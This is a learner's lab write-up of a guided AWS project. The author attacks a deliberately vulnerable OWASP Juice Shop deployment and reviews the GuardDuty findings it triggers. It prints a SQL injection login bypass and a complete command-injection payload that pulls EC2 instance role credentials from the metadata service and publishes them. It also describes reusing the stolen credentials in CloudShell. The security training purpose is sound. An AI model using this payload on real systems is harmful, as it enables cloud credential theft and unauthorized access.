# Threat Detection with GuardDuty

![Image](https://github.com/dev-boris67/AWS-Basics/blob/main/Project%20images/16.png?raw=true).

**Project Link:** [View Project](http://learn.nextwork.org/projects/aws-security-guardduty)

**Author:** Nchindo Boris  
**Email:** nchindoboris37@gmail.com

---

![Image](http://learn.nextwork.org/soothed_rose_serene_peach/uploads/aws-security-guardduty_v1w2x3y4)

---

## Introducing Today's Project!

### Tools and concepts

The services I used were;
- Amazon GuardDuty
- Amazon CloudFront
- Amazon S3
- AWS CloudFormation
- OWASP Juice Shop

Key concepts I learnt include;
- Deploy a web app using CloudFormation.
- Use SQL injection and arbitrary code execution to expose a web app.
- Steal credentials and sensitive data.
- Detect attacks using GuardDuty.
- Use malware protection to level up my GuardDuty skills.

### Project reflection

This project took me approximately 2 hours to complete

The most challenging part was Deploying the web app with CloudFormation. CloudFormation stack creation kept failing with rollbacks until I challenged the AWS Region and the problem was solved

It was most rewarding to see GuardDuty finding and detecting theats

I did this project today as it is one of the essential projects and goals in getting a cloud career

---

## Project Setup

To set up for this project, I deployed a CloudFormation template that launches a web app. The three main components are;
- Web app infrastructure
- S3 Bucket for storage
- GuardDuty for security monitoring

The web app deployed is called OWASP Juice Shop. To practice my GuardDuty skills, I will hack it to make GuardDuty analyze and picked up on my attacks.

GuardDuty is a threat detection service. In this project, it will help me find potential security risks or attacks in my apps and AWS environment. 

![Image](http://learn.nextwork.org/soothed_rose_serene_peach/uploads/aws-security-guardduty_n1o2p3q4)

---

## SQL Injection

The first attack I performed on the web app is SQL injection, which means a web vulnerability that happens when an attacker can insert malicious SQL code into an application's database queries. 

SQL injection is a security risk because it can let hackers bypass authentication, steal data, or even change the database structure.

My SQL injection attack involved the ' or 1=1;-- part which makes the query always evaluate to true, which lets you avoid the authentication check.

![Image](http://learn.nextwork.org/soothed_rose_serene_peach/uploads/aws-security-guardduty_h1i2j3k4)

---

## Command Injection

Next, I used command injection, which is 
#{global.process.mainModule.require('child_process').exec('CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") && echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}


The Juice Shop web app is vulnerable to this because the web app doesn't clean up or check the data it receives before processing it. This is known as sanitization.
Sanitization is a best practice where the app knows to strip out or block any harmful scripts or commands, so only harmless, intended data is processed.

To run command injection, I copied and pasted the javascript code in the username field. Proceeded to select Set Username 

The script will change profile's username to [object Object]

![Image](http://learn.nextwork.org/soothed_rose_serene_peach/uploads/aws-security-guardduty_t3u4v5w6)

---

## Attack Verification

To verify the attack's success, I opened the following URL  https://d1g5ryl8pjkav.cloudfront.net/assets/public/credentials.json

The credentials page showed me the private key credentials that the web app developer is using to store its details

![Image](http://learn.nextwork.org/soothed_rose_serene_peach/uploads/aws-security-guardduty_x7y8z9a0)

---

## Using CloudShell for Advanced Attacks

The attack continues in CloudShell, because I am trying to get access to private data using stolen credentials. To do this, I have to use CloudShell to run commands that a hacker would run to steal data inside the AWS environment.

In CloudShell, I used;
- wget to download the credentials.json file from our web app and into the CloudShell environment
- Next, I ran a command using cat to display what's inside a file and
- jq to process JSON data.

I then set up a profile, called stolen to use the stolen credentials extracted from the attack on the web application.

I had to create a new profile because this lets us 'hack into' the AWS environment, and I will have to see whether GuardDuty can pick up on the sneaky things I do as a hacker

![Image](http://learn.nextwork.org/soothed_rose_serene_peach/uploads/aws-security-guardduty_j9k0l1m2)

---

## GuardDuty's Findings

After performing the attack, GuardDuty reported a finding immediately
Findings are notifications that something suspicious has happened in your AWS environment.

The finding tells you what happened, who did it, and how they did it. This helps you understand the attack and fix the problem.

GuardDuty's finding was called UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS which means;
- UnauthorizedAccess = some someone tried to do something they shouldn’t have the rights to within your AWS environment.

- IAMUser/InstanceCredentialExfiltration is the unauthorized activity that GuardDuty detected. Credentials assigned to an EC2 instance (i.e. web server of your web app) were used in a suspicious way, so it's likely that they were stolen. This data breach is called exfiltration.

- InsideAWS tells us that the unauthorized access happened within AWS, but by a different AWS account to yours. 

Anomaly detection was used because GuardDuty would compare this activity against the instance's typical use of its AWS account credentials, and decide that copying an S3 bucket object is out of the ordinary.

GuardDuty's detailed finding about the unauthorized access, reported that;
- The Resource affected, indicating that the attack used an IAM role to access your juice shop's S3 bucket.

- The Action, indicating that an object (i.e. the important information text file) was retrieved.

- The Location and IP address of the attacker, which would be a location in my AWS Region at the time of using CloudShell.

This information is so helpful for analyzing the source of an attack, who the attacker could've been, whether there are threats to anticipate now based on what they retrieved, and how to prevent similar breaches in the future.

![Image](http://learn.nextwork.org/soothed_rose_serene_peach/uploads/aws-security-guardduty_v1w2x3y4)

---

## Extra: Malware Protection

For my project extension, I enabled  Malware Protection for S3

Malware is a type of software designed to harm computers.
It can damage computers, steal data, or disrupt operations. GuardDuty helps to protect AWS resources by detecting and preventing you from using malware in your environment.

To test Malware Protection, I uploaded malware into my S3 bucket
The uploaded file won't actually cause damage because It's like a fake virus that helps test if your antivirus software is working properly without actually using a real virus. In our case, we're using the test file to verify whether GuardDuty can detect malware.

Once I uploaded the file, GuardDuty instantly triggered the finding type Object:S3/MaliciousFile  

This verified that Malware Protection in GuardDuty is actively monitoring S3 bucket uploads and is capable of detecting known malware signatures

![Image](http://learn.nextwork.org/soothed_rose_serene_peach/uploads/aws-security-guardduty_sm42x3y4)

---

